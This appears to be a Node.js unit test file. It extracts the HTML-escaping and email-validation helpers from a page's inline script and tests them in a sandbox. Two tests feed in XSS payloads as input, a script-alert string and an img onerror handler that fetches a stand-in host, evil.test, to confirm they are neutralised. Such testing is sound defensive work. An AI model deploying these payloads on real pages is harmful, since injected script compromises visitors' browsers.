const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

function makeNoopProxy() {
  const target = function () {};
  return new Proxy(target, {
    get(_t, prop) {
      if (prop === Symbol.toPrimitive || prop === 'then') return undefined;
      return makeNoopProxy();
    },
    apply() {
      return makeNoopProxy();
    },
  });
}

function loadUtils() {
  const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  const scriptTagRe = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g;
  let match;
  let utilsSource = null;
  while ((match = scriptTagRe.exec(html)) !== null) {
    if (match[1].includes('window.escHTML = esc')) {
      utilsSource = match[1];
      break;
    }
  }
  assert.ok(utilsSource, 'could not locate the inline <script> block defining window.escHTML');

  const sandbox = {
    window: {},
    document: makeNoopProxy(),
    navigator: makeNoopProxy(),
    localStorage: makeNoopProxy(),
    console,
    setTimeout: () => 0,
    clearTimeout: () => {},
  };
  vm.createContext(sandbox);
  try {
    vm.runInContext(utilsSource, sandbox, { filename: 'index.html#v3-module' });
  } catch {
    // init()'s DOM-dependent side effects may throw against the stub DOM;
    // escHTML/validEmail are attached before init() runs, so it's already captured.
  }
  return sandbox.window;
}

const utils = loadUtils();

test('escHTML escapes the five HTML-significant characters', () => {
  assert.equal(utils.escHTML('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.equal(utils.escHTML(`"&'<>`), '&quot;&amp;&#39;&lt;&gt;');
});

test('escHTML neutralizes an onerror attribute-injection payload', () => {
  const payload = `<img src=x onerror="fetch('//evil.test')">`;
  const escaped = utils.escHTML(payload);
  assert.ok(!escaped.includes('<img'), 'raw <img tag must not survive escaping');
  assert.ok(!escaped.includes('"'), 'raw double quotes must not survive escaping');
});

test('escHTML handles null/undefined/non-string input without throwing', () => {
  assert.equal(utils.escHTML(null), '');
  assert.equal(utils.escHTML(undefined), '');
  assert.equal(utils.escHTML(42), '42');
});

test('validEmail accepts well-formed addresses', () => {
  assert.equal(utils.validEmail('client@example.com'), true);
  assert.equal(utils.validEmail('  client@example.com  '), true);
});

test('validEmail rejects malformed addresses', () => {
  assert.equal(utils.validEmail('not-an-email'), false);
  assert.equal(utils.validEmail('missing@tld'), false);
  assert.equal(utils.validEmail('@example.com'), false);
  assert.equal(utils.validEmail(''), false);
});
